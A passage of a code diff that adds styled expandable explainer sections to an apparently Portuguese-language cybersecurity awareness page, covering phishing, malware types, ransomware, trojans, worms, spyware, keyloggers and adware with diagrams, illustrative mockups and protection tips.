@@ -170,6 +170,118 @@ main { padding: 0 42px 70px; }
 }
 .topic a:hover { color: var(--green); border-color: var(--green); }
 
+/* ===== Deep-dive expandable sections ===== */
+.topic details.deep { margin-top: 14px; }
+.topic details.deep > summary {
+  cursor: pointer;
+  list-style: none;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  flex-wrap: wrap;
+  font-weight: 800;
+  font-size: 14px;
+  color: var(--purple);
+  background: rgba(162,89,255,.10);
+  border: 1px solid rgba(162,89,255,.35);
+  padding: 10px 14px;
+  border-radius: 12px;
+  user-select: none;
+  transition: background .15s, border-color .15s;
+}
+.topic details.deep > summary:hover { background: rgba(162,89,255,.18); border-color: rgba(162,89,255,.6); }
+.topic details.deep > summary::-webkit-details-marker { display: none; }
+.topic details.deep > summary::after { content: "▼ ver explicação completa"; font-size: 11px; color: var(--muted); font-weight: 600; margin-left: auto; }
+.topic details.deep[open] > summary::after { content: "▲ recolher"; }
+.topic details.deep[open] > summary { margin-bottom: 14px; }
+
+.deep-body {
+  border-left: 3px solid rgba(162,89,255,.4);
+  padding: 2px 0 6px 16px;
+  animation: fadeIn .25s ease;
+}
+@keyframes fadeIn { from { opacity: 0; transform: translateY(-4px); } to { opacity: 1; transform: none; } }
+.deep-body h4 {
+  margin: 20px 0 8px;
+  font-size: 13px;
+  letter-spacing: 1.2px;
+  text-transform: uppercase;
+  color: var(--cyan);
+}
+.deep-body h4:first-child { margin-top: 4px; }
+.deep-body p { color: #cdddec; font-size: 14.5px; line-height: 1.65; margin: 8px 0; }
+.deep-body b { color: var(--yellow); }
+.deep-body em { color: #fff; font-style: normal; font-weight: 700; }
+.deep-body code {
+  background: rgba(0,0,0,.5);
+  border: 1px solid rgba(0,217,255,.25);
+  padding: 1px 6px;
+  border-radius: 6px;
+  font-family: "JetBrains Mono", Consolas, ui-monospace, monospace;
+  font-size: 13px;
+  color: var(--green);
+  word-break: break-word;
+}
+.deep-body ol.steps { margin: 10px 0; padding: 0; counter-reset: step; list-style: none; }
+.deep-body ol.steps li {
+  position: relative;
+  padding: 9px 0 9px 42px;
+  color: #cdddec;
+  font-size: 14px;
+  line-height: 1.5;
+  border-bottom: 1px solid rgba(255,255,255,.05);
+}
+.deep-body ol.steps li::before {
+  counter-increment: step;
+  content: counter(step);
+  position: absolute; left: 0; top: 7px;
+  width: 27px; height: 27px;
+  display: grid; place-items: center;
+  background: linear-gradient(135deg, var(--cyan), #0066ff);
+  color: #021019; font-weight: 900; font-size: 13px;
+  border-radius: 50%;
+}
+.deep-body ul.bullets { margin: 8px 0; padding-left: 20px; color: #cdddec; font-size: 14px; line-height: 1.6; }
+.deep-body ul.bullets li { margin: 6px 0; }
+.deep-body ul.bullets b { color: var(--green); }
+
+/* Figures / diagrams */
+.deep-fig { margin: 16px 0; text-align: center; }
+.deep-fig svg { max-width: 100%; height: auto; display: block; margin: 0 auto; }
+.deep-fig img { max-width: 100%; border-radius: 12px; border: 1px solid rgba(0,217,255,.3); }
+.deep-fig figcaption { color: var(--muted); font-size: 12.5px; margin-top: 9px; font-style: italic; }
+
+/* Callout boxes */
+.callout { border-radius: 12px; padding: 12px 14px; margin: 13px 0; font-size: 13.5px; line-height: 1.55; border: 1px solid; }
+.callout.danger { background: rgba(255,46,136,.08); border-color: rgba(255,46,136,.35); color: #ffd9e6; }
+.callout.tip { background: rgba(116,255,0,.07); border-color: rgba(116,255,0,.3); color: #e3ffd0; }
+.callout.danger b { color: var(--pink); }
+.callout.tip b { color: var(--green); }
+
+/* Comparison table */
+.cmp { width: 100%; border-collapse: collapse; margin: 12px 0; font-size: 13px; }
+.cmp th, .cmp td { border: 1px solid rgba(0,217,255,.18); padding: 8px 10px; text-align: left; color: #cdddec; vertical-align: top; }
+.cmp th { background: rgba(0,217,255,.10); color: var(--cyan); font-size: 12px; letter-spacing: .5px; }
+
+/* Realistic mockups (terminal / email / lock screen) */
+.mock { margin: 16px 0; border-radius: 10px; overflow: hidden; text-align: left; border: 1px solid rgba(255,255,255,.12); }
+.mock .bar { background: #161b27; padding: 8px 12px; display: flex; align-items: center; gap: 7px; font-size: 12px; color: var(--muted); }
+.mock .bar i { width: 11px; height: 11px; border-radius: 50%; display: inline-block; }
+.mock .bar i.r { background: #ff5f56; } .mock .bar i.y { background: #ffbd2e; } .mock .bar i.g { background: #27c93f; }
+.mock .bar .ttl { margin-left: 8px; font-family: ui-monospace, monospace; }
+.mock-term { background: #0a0e17; }
+.mock-term pre { margin: 0; padding: 13px 14px; font-family: "JetBrains Mono", Consolas, ui-monospace, monospace; font-size: 12.5px; line-height: 1.55; color: #c8f7c5; white-space: pre-wrap; word-break: break-word; }
+.mock-term .c { color: var(--cyan); } .mock-term .g { color: var(--green); } .mock-term .y { color: var(--yellow); } .mock-term .p { color: var(--pink); } .mock-term .m { color: var(--muted); } .mock-term .w { color: #fff; }
+.mock-mail { background: #0e1626; padding: 0; }
+.mock-mail .hd { padding: 12px 14px; border-bottom: 1px solid rgba(255,255,255,.08); font-size: 13px; }
+.mock-mail .hd .from { color: #fff; font-weight: 700; }
+.mock-mail .hd .addr { color: var(--pink); font-size: 12px; }
+.mock-mail .hd .subj { color: var(--yellow); margin-top: 6px; font-weight: 700; }
+.mock-mail .bd { padding: 14px; color: #d7e3f0; font-size: 13.5px; line-height: 1.6; }
+.mock-mail .bd .fakebtn { display: inline-block; background: #1a6fff; color: #fff; padding: 9px 18px; border-radius: 6px; font-weight: 700; margin: 10px 0; text-decoration: none; }
+.mock-mail .flag { display: block; color: var(--pink); font-size: 12px; margin: 6px 0; padding-left: 22px; position: relative; }
+.mock-mail .flag::before { content: "🚩"; position: absolute; left: 0; }
+
 /* Quiz */
 .quiz {
   max-width: 900px;
@@ -535,6 +647,85 @@ main { padding: 0 42px 70px; }
       <div class="line"><b>O que é:</b> E-mail/SMS falso imitando entidade confiável para roubar dados.</div>
       <div class="line"><b>Por que aprender:</b> Vetor #1 de invasões corporativas.</div>
       <a href="https://www.phishing.org/what-is-phishing" target="_blank">phishing.org ↗</a>
+
+      <details class="deep">
+        <summary>📖 Aprender a fundo</summary>
+        <div class="deep-body">
+          <h4>Explicação completa</h4>
+          <p><b>Phishing</b> (do inglês <em>fishing</em>, "pescar") é um ataque de <b>engenharia social</b>: o criminoso se passa por uma entidade confiável — banco, Correios, Netflix, Receita Federal, ou até o RH da sua empresa — para te induzir a entregar dados (senha, cartão, código do app) ou clicar num link malicioso. Não existe "hack técnico" aqui: a vulnerabilidade explorada é o <em>ser humano</em> — pressa, medo, curiosidade e respeito à autoridade.</p>
+
+          <h4>Como funciona na prática</h4>
+          <figure class="deep-fig">
+            <svg viewBox="0 0 680 150" role="img" aria-label="Fluxo de um ataque de phishing">
+              <defs><marker id="arrPhish" markerWidth="9" markerHeight="9" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#00d9ff"/></marker></defs>
+              <g font-family="Inter, sans-serif" font-size="12" fill="#eef6ff" text-anchor="middle">
+                <rect x="6" y="45" width="118" height="58" rx="10" fill="rgba(255,46,136,.12)" stroke="#ff2e88"/>
+                <text x="65" y="70">👤 Atacante</text><text x="65" y="88" font-size="10" fill="#9fb5c8">cria isca</text>
+                <rect x="146" y="45" width="118" height="58" rx="10" fill="rgba(255,214,10,.10)" stroke="#ffd60a"/>
+                <text x="205" y="70">✉️ E-mail falso</text><text x="205" y="88" font-size="10" fill="#9fb5c8">"conta bloqueada!"</text>
+                <rect x="286" y="45" width="118" height="58" rx="10" fill="rgba(0,217,255,.10)" stroke="#00d9ff"/>
+                <text x="345" y="70">🖱️ Vítima clica</text><text x="345" y="88" font-size="10" fill="#9fb5c8">no link</text>
+                <rect x="426" y="45" width="118" height="58" rx="10" fill="rgba(162,89,255,.12)" stroke="#a259ff"/>
+                <text x="485" y="70">🌐 Site clone</text><text x="485" y="88" font-size="10" fill="#9fb5c8">login idêntico</text>
+                <rect x="566" y="45" width="108" height="58" rx="10" fill="rgba(255,46,136,.12)" stroke="#ff2e88"/>
+                <text x="620" y="70">🔑 Senha</text><text x="620" y="88" font-size="10" fill="#9fb5c8">roubada</text>
+                <g stroke="#00d9ff" stroke-width="2" marker-end="url(#arrPhish)">
+                  <line x1="125" y1="74" x2="143" y2="74"/><line x1="265" y1="74" x2="283" y2="74"/>
+                  <line x1="405" y1="74" x2="423" y2="74"/><line x1="545" y1="74" x2="563" y2="74"/>
+                </g>
+              </g>
+            </svg>
+            <figcaption>O caminho da isca: a vítima só vê o e-mail e o site clone; o roubo acontece nos bastidores.</figcaption>
+          </figure>
+          <ol class="steps">
+            <li>O atacante registra um domínio parecido (<code>itau-seguro.com</code> em vez de <code>itau.com.br</code>) e <b>clona</b> a página de login real.</li>
+            <li>Dispara milhares de e-mails/SMS com um <b>gatilho emocional</b>: "sua conta será bloqueada em 24h", "você ganhou um prêmio", "atualize seus dados".</li>
+            <li>A vítima clica e cai no site clone — visualmente idêntico ao verdadeiro.</li>
+            <li>Ao digitar login e senha, os dados vão direto para o servidor do criminoso.</li>
+            <li>O clone te redireciona para o site real logo depois — você nem percebe que foi roubado.</li>
+          </ol>
+
+          <h4>Como é na vida real (exemplo de e-mail)</h4>
+          <figure class="deep-fig">
+            <div class="mock mock-mail">
+              <div class="bar"><i class="r"></i><i class="y"></i><i class="g"></i><span class="ttl">Caixa de entrada</span></div>
+              <div class="hd">
+                <div class="from">Banco Seguro S.A. <span class="addr">&lt;suporte@banco-seguro-verificacao.com&gt;</span></div>
+                <div class="subj">⚠️ AÇÃO URGENTE: sua conta será suspensa em 24 horas</div>
+              </div>
+              <div class="bd">
+                Prezado cliente, detectamos um acesso suspeito. Para evitar o bloqueio,
+                confirme seus dados <b>imediatamente</b>:
+                <a class="fakebtn" href="#" onclick="return false;">Verificar minha conta agora</a>
+                <span class="flag">Domínio estranho, não é o oficial do banco</span>
+                <span class="flag">Senso de urgência forçado ("24 horas")</span>
+                <span class="flag">Saudação genérica ("Prezado cliente")</span>
+                <span class="flag">Botão esconde o link real (passe o mouse e veja)</span>
+              </div>
+            </div>
+            <figcaption>Mockup ilustrativo. As 🚩 são os sinais clássicos que denunciam um phishing.</figcaption>
+          </figure>
+
+          <h4>Variações que você vai ouvir</h4>
+          <ul class="bullets">
+            <li><b>Spear phishing:</b> direcionado a uma pessoa específica (com nome, cargo, contexto real).</li>
+            <li><b>Whaling:</b> mira "peixes grandes" — CEO, diretor financeiro.</li>
+            <li><b>Smishing:</b> phishing por SMS. <b>Vishing:</b> por ligação de voz.</li>
+            <li><b>Clone phishing:</b> copia um e-mail legítimo que você já recebeu e troca o link.</li>
+          </ul>
+
+          <div class="callout danger"><b>Caso real:</b> em 2016, o ataque que vazou os e-mails do comitê do Partido Democrata (EUA) começou com um simples e-mail de phishing pedindo "redefinição de senha do Gmail". Um clique derrubou uma campanha presidencial inteira.</div>
+
+          <h4>Como se proteger</h4>
+          <ul class="bullets">
+            <li>Desconfie de <b>urgência</b> e ameaças. Banco não pede senha por e-mail/SMS.</li>
+            <li><b>Confira o domínio</b> com calma — passe o mouse sobre o link antes de clicar.</li>
+            <li>Nunca digite senha vindo de um link de e-mail: acesse o site <b>digitando o endereço</b>.</li>
+            <li>Ative <b>2FA</b> — mesmo com a senha roubada, o atacante trava no segundo fator.</li>
+            <li>Na dúvida, ligue para o canal oficial da empresa.</li>
+          </ul>
+        </div>
+      </details>
     </div>
 
     <div class="topic">
@@ -549,6 +740,36 @@ main { padding: 0 42px 70px; }
       <div class="line"><b>O que é:</b> Termo guarda-chuva para qualquer software malicioso.</div>
       <div class="line"><b>Por que aprender:</b> Vírus, trojan, ransomware — tudo é malware.</div>
       <a href="https://www.malwarebytes.com/malware" target="_blank">Malwarebytes — O que é malware ↗</a>
+
+      <details class="deep">
+        <summary>📖 Aprender a fundo</summary>
+        <div class="deep-body">
+          <h4>Explicação completa</h4>
+          <p><b>Malware</b> = <em>malicious software</em> (software malicioso). É o termo <b>guarda-chuva</b> para todo programa criado para causar dano, roubar dados ou tomar controle de um dispositivo sem o seu consentimento. Vírus, worm, trojan, ransomware, spyware, keylogger, rootkit e adware são <b>todos</b> tipos de malware — eles se diferenciam pela forma como se espalham e pelo objetivo final.</p>
+
+          <h4>A "família" do malware (entenda as diferenças)</h4>
+          <table class="cmp">
+            <tr><th>Tipo</th><th>Como se espalha</th><th>Objetivo principal</th></tr>
+            <tr><td><b>Vírus</b></td><td>Anexado a um arquivo; precisa que você execute</td><td>Corromper/infectar outros arquivos</td></tr>
+            <tr><td><b>Worm</b></td><td>Sozinho, pela rede (não precisa de você)</td><td>Se replicar e se espalhar em massa</td></tr>
+            <tr><td><b>Trojan</b></td><td>Disfarçado de programa útil</td><td>Abrir uma porta para o atacante</td></tr>
+            <tr><td><b>Ransomware</b></td><td>Phishing, trojan ou exploit</td><td>Criptografar e cobrar resgate</td></tr>
+            <tr><td><b>Spyware</b></td><td>Vem junto de outro software</td><td>Espionar e coletar dados</td></tr>
+            <tr><td><b>Rootkit</b></td><td>Pós-invasão, no núcleo do sistema</td><td>Esconder-se e manter acesso</td></tr>
+          </table>
+
+          <h4>Ciclo de vida típico de uma infecção</h4>
+          <ol class="steps">
+            <li><b>Entrega:</b> chega por e-mail (phishing), pendrive, download pirata ou site comprometido.</li>
+            <li><b>Execução:</b> é rodado — por você (clicando) ou automaticamente (explorando uma falha).</li>
+            <li><b>Persistência:</b> se instala para sobreviver a reinicializações.</li>
+            <li><b>Ação:</b> executa o objetivo — roubar, criptografar, espionar, minerar.</li>
+            <li><b>Comunicação (C2):</b> "liga para casa", enviando dados ao servidor do atacante.</li>
+          </ol>
+
+          <div class="callout tip"><b>Como se defende:</b> antivírus/EDR atualizado, não rodar arquivos de origem duvidosa, manter o sistema com patches em dia, e princípio do menor privilégio (não usar tudo como admin).</div>
+        </div>
+      </details>
     </div>
 
     <div class="topic">
@@ -556,6 +777,67 @@ main { padding: 0 42px 70px; }
       <div class="line"><b>O que é:</b> Malware que criptografa arquivos e cobra resgate.</div>
       <div class="line"><b>Por que aprender:</b> Maior prejuízo corporativo da década (WannaCry, LockBit).</div>
       <a href="https://www.cisa.gov/stopransomware" target="_blank">CISA — Stop Ransomware ↗</a>
+
+      <details class="deep">
+        <summary>📖 Aprender a fundo</summary>
+        <div class="deep-body">
+          <h4>Explicação completa</h4>
+          <p><b>Ransomware</b> (de <em>ransom</em>, "resgate") é o malware que <b>criptografa seus arquivos</b> — fotos, planilhas, bancos de dados — e exige um pagamento (geralmente em criptomoeda) para te devolver a chave de descriptografia. Sem a chave, os dados ficam matematicamente inacessíveis. É o ataque mais lucrativo e destrutivo da última década.</p>
+
+          <h4>Como funciona na prática</h4>
+          <figure class="deep-fig">
+            <svg viewBox="0 0 680 150" role="img" aria-label="Fluxo de um ataque de ransomware">
+              <defs><marker id="arrRansom" markerWidth="9" markerHeight="9" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#ff2e88"/></marker></defs>
+              <g font-family="Inter, sans-serif" font-size="11.5" fill="#eef6ff" text-anchor="middle">
+                <rect x="6" y="45" width="120" height="58" rx="10" fill="rgba(0,217,255,.10)" stroke="#00d9ff"/>
+                <text x="66" y="68">📧 Entrada</text><text x="66" y="86" font-size="10" fill="#9fb5c8">phishing/exploit</text>
+                <rect x="148" y="45" width="120" height="58" rx="10" fill="rgba(255,214,10,.10)" stroke="#ffd60a"/>
+                <text x="208" y="68">🔓 Executa</text><text x="208" y="86" font-size="10" fill="#9fb5c8">e se espalha</text>
+                <rect x="290" y="45" width="120" height="58" rx="10" fill="rgba(162,89,255,.12)" stroke="#a259ff"/>
+                <text x="350" y="68">🔐 Criptografa</text><text x="350" y="86" font-size="10" fill="#9fb5c8">todos os arquivos</text>
+                <rect x="432" y="45" width="120" height="58" rx="10" fill="rgba(255,46,136,.12)" stroke="#ff2e88"/>
+                <text x="492" y="68">💀 Bloqueio</text><text x="492" y="86" font-size="10" fill="#9fb5c8">tela de resgate</text>
+                <rect x="574" y="45" width="100" height="58" rx="10" fill="rgba(255,46,136,.18)" stroke="#ff2e88"/>
+                <text x="624" y="68">💰 Resgate</text><text x="624" y="86" font-size="10" fill="#9fb5c8">em bitcoin</text>
+                <g stroke="#ff2e88" stroke-width="2" marker-end="url(#arrRansom)">
+                  <line x1="127" y1="74" x2="145" y2="74"/><line x1="269" y1="74" x2="287" y2="74"/>
+                  <line x1="411" y1="74" x2="429" y2="74"/><line x1="553" y1="74" x2="571" y2="74"/>
+                </g>
+              </g>
+            </svg>
+          </figure>
+
+          <h4>Como é na vida real (tela de resgate)</h4>
+          <figure class="deep-fig">
+            <div class="mock mock-term" style="border-color:rgba(255,46,136,.5)">
+              <div class="bar" style="background:#2a0d18"><i class="r"></i><i class="y"></i><i class="g"></i><span class="ttl" style="color:#ff8fb3">!!! SEUS ARQUIVOS FORAM CRIPTOGRAFADOS !!!</span></div>
+              <pre><span class="p">  ╔══════════════════════════════════╗
+  ║   💀  OOPS, YOUR FILES ARE GONE   ║
+  ╚══════════════════════════════════╝</span>
+
+<span class="w">Todos os seus documentos, fotos e bancos de dados
+foram criptografados com AES-256.</span>
+
+<span class="y">Para recuperá-los, envie 0,05 BTC para:</span>
+<span class="c">  bc1q xxxx xxxx xxxx xxxx xxxx xxxx</span>
+
+<span class="p">⏳ Tempo restante: 71:59:42</span>
+<span class="m">Após o prazo, a chave será destruída para sempre.</span></pre>
+            </div>
+            <figcaption>Mockup ilustrativo no estilo do WannaCry: relógio regressivo + carteira de criptomoeda para pressionar o pagamento.</figcaption>
+          </figure>
+
+          <div class="callout danger"><b>Caso real — WannaCry (2017):</b> explorou uma falha do Windows (EternalBlue) e infectou +200 mil computadores em 150 países em poucos dias, parando hospitais no Reino Unido e fábricas inteiras. A correção da Microsoft já existia há 2 meses — quem não atualizou, caiu.</div>
+
+          <h4>Como se proteger</h4>
+          <ul class="bullets">
+            <li><b>Backup 3-2-1:</b> 3 cópias, 2 mídias diferentes, 1 fora do local (e offline). É a ÚNICA defesa garantida.</li>
+            <li>Mantenha o sistema <b>atualizado</b> — a maioria dos ataques usa falhas já corrigidas.</li>
+            <li>Não pague o resgate: financia o crime e <b>não garante</b> a recuperação.</li>
+            <li>Cuidado com anexos e macros do Office — vetor de entrada nº 1.</li>
+          </ul>
+        </div>
+      </details>
     </div>
 
     <div class="topic">
@@ -563,6 +845,29 @@ main { padding: 0 42px 70px; }
       <div class="line"><b>O que é:</b> Malware disfarçado de software legítimo.</div>
       <div class="line"><b>Por que aprender:</b> "Otimizador grátis" = backdoor 99% das vezes.</div>
       <a href="https://www.kaspersky.com/resource-center/threats/trojans" target="_blank">Kaspersky — Trojans ↗</a>
+
+      <details class="deep">
+        <summary>📖 Aprender a fundo</summary>
+        <div class="deep-body">
+          <h4>Explicação completa</h4>
+          <p>O nome vem do <b>Cavalo de Troia</b> da mitologia grega: por fora, um "presente" útil; por dentro, soldados escondidos. Um <b>Trojan</b> (trojan horse) é um malware que se disfarça de programa legítimo e desejável — um jogo crackeado, um "otimizador de PC", um instalador do Photoshop "grátis" — para que <em>você mesmo</em> o execute. Diferente de vírus e worms, ele <b>não se replica</b>: depende 100% de te enganar para entrar.</p>
+
+          <h4>Como funciona na prática</h4>
+          <ol class="steps">
+            <li>Você baixa um programa "atraente" (crack, mod, app pirata, anexo).</li>
+            <li>Ele realmente faz o que promete — para você não desconfiar.</li>
+            <li>Em segundo plano, instala silenciosamente o <b>payload</b> malicioso.</li>
+            <li>O payload abre um <b>backdoor</b>, baixa outros malwares ou rouba dados.</li>
+          </ol>
+          <div class="callout danger"><b>Regra de ouro:</b> software "premium de graça" quase sempre é o produto sendo VOCÊ. Trojans bancários como o brasileiro <em>Grandoreiro</em> roubaram milhões fingindo ser atualizações ou notas fiscais.</div>
+          <h4>Como se proteger</h4>
+          <ul class="bullets">
+            <li>Baixe apps só de <b>fontes oficiais</b> (site do fabricante, lojas verificadas).</li>
+            <li>Fuja de cracks e "ativadores" — é o disfarce favorito de trojan.</li>
+            <li>Verifique a extensão real: <code>fatura.pdf.exe</code> é executável, não PDF.</li>
+          </ul>
+        </div>
+      </details>
     </div>
 
     <div class="topic">
@@ -570,6 +875,16 @@ main { padding: 0 42px 70px; }
       <div class="line"><b>O que é:</b> Malware autorreplicante que se espalha sozinho pela rede.</div>
       <div class="line"><b>Por que aprender:</b> O Morris Worm (1988) foi o primeiro grande susto.</div>
       <a href="https://www.imperva.com/learn/application-security/computer-worm/" target="_blank">Imperva — Worm ↗</a>
+
+      <details class="deep">
+        <summary>📖 Aprender a fundo</summary>
+        <div class="deep-body">
+          <h4>Explicação completa</h4>
+          <p>O <b>worm</b> (verme) é o tipo de malware que se <b>autorreplica e se espalha sozinho</b> pela rede, sem precisar de um arquivo hospedeiro e <em>sem ação humana</em>. Ele encontra outras máquinas vulneráveis, se copia para elas, e dali continua se multiplicando — crescimento exponencial. É a diferença-chave para o vírus, que precisa que <em>você</em> execute algo.</p>
+          <div class="callout danger"><b>Caso real — Morris Worm (1988):</b> o primeiro worm da história a ganhar destaque. Devido a um erro de cálculo, ele se replicava várias vezes na mesma máquina, derrubando ~10% da internet da época. Resultou na primeira condenação sob a lei de crimes informáticos dos EUA.</div>
+          <p>Worms modernos (como o que carregou o <b>WannaCry</b>) podem espalhar ransomware por uma empresa inteira em minutos.</p>
+        </div>
+      </details>
     </div>
 
     <div class="topic">
@@ -577,6 +892,21 @@ main { padding: 0 42px 70px; }
       <div class="line"><b>O que é:</b> Malware que precisa de ação humana para se propagar.</div>
       <div class="line"><b>Por que aprender:</b> A categoria mais clássica.</div>
       <a href="https://www.avast.com/c-computer-virus" target="_blank">Avast — O que é vírus ↗</a>
+
+      <details class="deep">
+        <summary>📖 Aprender a fundo</summary>
+        <div class="deep-body">
+          <h4>Explicação completa</h4>
+          <p>O <b>vírus</b> de computador funciona como um vírus biológico: ele se <b>anexa a um arquivo ou programa hospedeiro</b> e só se ativa e se replica quando esse hospedeiro é <b>executado por você</b>. Sem essa ação humana, ele fica dormente. Ao rodar, ele infecta outros arquivos da máquina, e pode corromper dados, deletar arquivos ou abrir caminho para outros ataques.</p>
+          <h4>Vírus × Worm (a confusão mais comum)</h4>
+          <table class="cmp">
+            <tr><th></th><th>🦠 Vírus</th><th>🪱 Worm</th></tr>
+            <tr><td><b>Precisa de hospedeiro?</b></td><td>Sim, anexa-se a um arquivo</td><td>Não, é autônomo</td></tr>
+            <tr><td><b>Precisa de você?</b></td><td>Sim, você executa</td><td>Não, espalha sozinho</td></tr>
+            <tr><td><b>Como espalha</b></td><td>Você compartilha o arquivo</td><td>Pela rede, automaticamente</td></tr>
+          </table>
+        </div>
+      </details>
     </div>
 
     <div class="topic">
@@ -584,6 +914,27 @@ main { padding: 0 42px 70px; }
       <div class="line"><b>O que é:</b> Software espião que coleta dados sem consentimento.</div>
       <div class="line"><b>Por que aprender:</b> Pegasus, FinFisher — espionagem real e cara.</div>
       <a href="https://us.norton.com/blog/malware/spyware" target="_blank">Norton — Spyware ↗</a>
+
+      <details class="deep">
+        <summary>📖 Aprender a fundo</summary>
+        <div class="deep-body">
+          <h4>Explicação completa</h4>
+          <p><b>Spyware</b> é o malware <b>espião</b>: ele se instala silenciosamente e coleta informações sobre você — sites visitados, mensagens, localização, contatos, áudio do microfone e até a tela — enviando tudo para um terceiro, <b>sem o seu consentimento</b>. O objetivo pode ser propaganda, fraude financeira ou espionagem direcionada de governos.</p>
+          <h4>O que um spyware costuma capturar</h4>
+          <ul class="bullets">
+            <li><b>Hábitos de navegação</b> e histórico (para perfis de anúncio ou chantagem).</li>
+            <li><b>Credenciais</b> e dados bancários digitados.</li>
+            <li><b>Localização, microfone e câmera</b> nos casos mais invasivos (stalkerware).</li>
+          </ul>
+          <div class="callout danger"><b>Caso real — Pegasus (NSO Group):</b> spyware capaz de infectar um iPhone <em>sem nenhum clique</em> (zero-click), lendo WhatsApp, e-mails e ativando o microfone. Foi usado contra jornalistas e ativistas no mundo todo — espionagem de nível militar virou produto.</div>
+          <h4>Como se proteger</h4>
+          <ul class="bullets">
+            <li>Mantenha o celular/PC <b>atualizado</b> (fecha as falhas zero-click).</li>
+            <li>Revise as <b>permissões</b> dos apps (microfone, localização, acessibilidade).</li>
+            <li>Cuidado com "apps de monitoramento" — muitos são stalkerware disfarçado.</li>
+          </ul>
+        </div>
+      </details>
     </div>
 
     <div class="topic">
@@ -591,6 +942,45 @@ main { padding: 0 42px 70px; }
       <div class="line"><b>O que é:</b> Registra tudo que é digitado no teclado.</div>
       <div class="line"><b>Por que aprender:</b> Rouba senhas mesmo com criptografia no canal.</div>
       <a href="https://www.kaspersky.com/resource-center/definitions/keylogger" target="_blank">Kaspersky — Keylogger ↗</a>
+
+      <details class="deep">
+        <summary>📖 Aprender a fundo</summary>
+        <div class="deep-body">
+          <h4>Explicação completa</h4>
+          <p><b>Keylogger</b> (de <em>key</em> = tecla + <em>logger</em> = registrador) é um espião que grava <b>cada tecla que você pressiona</b>. Como ele captura no momento em que você digita — <em>antes</em> de qualquer criptografia — ele rouba senhas, números de cartão e mensagens mesmo em sites HTTPS. Pode ser <b>software</b> (um programa escondido) ou <b>hardware</b> (um pequeno dispositivo plugado entre o teclado e o PC).</p>
+
+          <h4>Como funciona na prática</h4>
+          <figure class="deep-fig">
+            <svg viewBox="0 0 660 150" role="img" aria-label="Fluxo de um keylogger">
+              <defs><marker id="arrKey" markerWidth="9" markerHeight="9" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#a259ff"/></marker></defs>
+              <g font-family="Inter, sans-serif" font-size="11.5" fill="#eef6ff" text-anchor="middle">
+                <rect x="6" y="45" width="135" height="58" rx="10" fill="rgba(0,217,255,.10)" stroke="#00d9ff"/>
+                <text x="73" y="68">⌨️ Você digita</text><text x="73" y="86" font-size="10" fill="#9fb5c8">senha do banco</text>
+                <rect x="171" y="45" width="135" height="58" rx="10" fill="rgba(255,46,136,.12)" stroke="#ff2e88"/>
+                <text x="238" y="68">🕵️ Keylogger</text><text x="238" y="86" font-size="10" fill="#9fb5c8">grava cada tecla</text>
+                <rect x="336" y="45" width="135" height="58" rx="10" fill="rgba(255,214,10,.10)" stroke="#ffd60a"/>
+                <text x="403" y="68">📄 Log oculto</text><text x="403" y="86" font-size="10" fill="#9fb5c8">"banco s3nh4123"</text>
+                <rect x="501" y="45" width="153" height="58" rx="10" fill="rgba(162,89,255,.12)" stroke="#a259ff"/>
+                <text x="577" y="68">📤 Envia ao atacante</text><text x="577" y="86" font-size="10" fill="#9fb5c8">internet</text>
+                <g stroke="#a259ff" stroke-width="2" marker-end="url(#arrKey)">
+                  <line x1="142" y1="74" x2="168" y2="74"/><line x1="307" y1="74" x2="333" y2="74"/><line x1="472" y1="74" x2="498" y2="74"/>
+                </g>
+              </g>
+            </svg>
+            <figcaption>Por capturar a tecla na origem, o keylogger ignora HTTPS, VPN e criptografia — ele lê antes de tudo isso acontecer.</figcaption>
+          </figure>
+
+          <div class="callout danger"><b>Por que é tão perigoso:</b> você pode estar num site 100% seguro (cadeado verde, HTTPS), com VPN ligada, e mesmo assim ter a senha roubada — porque o vazamento acontece no seu <em>próprio teclado</em>, não na rede.</div>
+
+          <h4>Como se proteger</h4>
+          <ul class="bullets">
+            <li>Use <b>2FA</b> — a senha sozinha não basta para o atacante entrar.</li>
+            <li><b>Gerenciador de senhas</b> que preenche por autofill (não digita = nada para gravar).</li>
+            <li>Antivírus/EDR atualizado e cuidado com pendrives e cabos desconhecidos.</li>
+            <li>Em PCs públicos, considere o teclado virtual e <b>nunca</b> acesse o banco.</li>
+          </ul>
+        </div>
+      </details>
     </div>
 
     <div class="topic">
@@ -598,6 +988,21 @@ main { padding: 0 42px 70px; }
       <div class="line"><b>O que é:</b> Exibe anúncios indesejados, geralmente disfarçado de freeware.</div>
       <div class="line"><b>Por que aprender:</b> Aparentemente "leve" — mas costuma vir junto com spyware.</div>
       <a href="https://www.malwarebytes.com/adware" target="_blank">Malwarebytes — Adware ↗</a>
+
+      <details class="deep">
+        <summary>📖 Aprender a fundo</summary>
+        <div class="deep-body">
+          <h4>Explicação completa</h4>
+          <p><b>Adware</b> (de <em>advertising</em> + <em>software</em>) é o malware focado em <b>exibir anúncios à força</b>: pop-ups que não fecham, banners injetados em sites, abas que abrem sozinhas e a página inicial/buscador do navegador sequestrados. Costuma chegar "de carona" (bundled) com programas gratuitos — aquele instalador com vários "Avançar" e caixinhas pré-marcadas.</p>
+          <h4>Por que não é tão "inofensivo" quanto parece</h4>
+          <ul class="bullets">
+            <li><b>Rastreia</b> sua navegação para mirar anúncios — virando quase spyware.</li>
+            <li>Deixa o aparelho <b>lento</b> e consome dados/bateria.</li>
+            <li>Os anúncios injetados podem levar a <b>golpes e mais malware</b> (malvertising).</li>
+          </ul>
+          <div class="callout tip"><b>Dica de instalação:</b> sempre escolha o modo <b>"Personalizado/Avançado"</b> ao instalar freeware e <em>desmarque</em> as ofertas de "barra de ferramentas", "antivírus extra" e mudança de buscador.</div>
+        </div>
+      </details>
     </div>
 
     <div class="topic">
@@ -605,6 +1010,37 @@ main { padding: 0 42px 70px; }
       <div class="line"><b>O que é:</b> Ferramentas que mantêm acesso oculto e privilegiado.</div>
       <div class="line"><b>Por que aprender:</b> Quase impossível de detectar sem ferramentas dedicadas.</div>
       <a href="https://www.kaspersky.com/resource-center/definitions/what-is-rootkit" target="_blank">Kaspersky — Rootkit ↗</a>
+
+      <details class="deep">
+        <summary>📖 Aprender a fundo</summary>
+        <div class="deep-body">
+          <h4>Explicação completa</h4>
